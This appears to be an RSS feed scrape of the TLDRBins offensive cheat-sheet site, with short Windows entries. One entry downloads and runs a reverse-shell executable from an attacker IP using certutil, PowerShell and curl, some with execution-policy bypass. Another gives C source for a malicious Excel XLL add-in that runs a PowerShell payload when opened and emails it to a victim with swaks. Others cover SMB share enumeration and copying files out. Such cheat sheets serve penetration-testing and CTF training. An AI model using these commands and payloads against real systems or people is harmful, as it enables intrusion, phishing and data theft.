channel.title: Windows on TLDRBins
channel.description: Recent content in Windows on TLDRBins

item.title: File Transfer (Linux to Windows)
item.description: HTTP Start a Local HTTP Server python3 -m http.server 80 cmd certutil -urlcache -split -f http://10.10.14.10/rev.exe c:\windows\tasks\rev.exe # Upload and Run certutil -urlcache -split -f http://10.10.14.10/rev.exe c:\windows\tasks\rev.exe && c:\windows\tasks\rev.exe powershell # Long version Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile c:\windows\tasks\rev.exe # Short version iwr http://10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe Note: PowerShell 3.0+ # Long version powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe # Short version powershell -ep bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe Note: curl is not always available

item.title: File Transfer (Windows To Linux)
item.description: SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share Base64 Encoding (for small binary) # In target Windows [System.

item.title: Phishing
item.description: Phishing with XLL (Excel) revshells.com shell.c #include <windows.h> __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec("<PowerShell #3 Base64 Payload>", 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } Compile shell.c using Linux x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32 Send email with the malicious xll file swaks --to "victim@victim.

item.title: SMB Enumeration
item.description: SMB Share Enum Login without password smbmap smbmap -H 10.10.11.10 smbmap -H 10.10.11.10 -u null smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ #After connection #List all files in a share recurse ON ls #Download all files mask "" recurse ON prompt OFF mget * Login with password smbclient -L \\\\10.10.11.10\\ -U domain/username%password #After found an accessible share smbclient \\\\10.10.11.10\\share\\ -U domain/username%password Mount SMB Share sudo mount -t cifs "//10.

item.title: SMB Server
item.description: Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username test -password test Note: Sometimes smb server with creds may not work For older Windows Machines impacket-smbserver share .
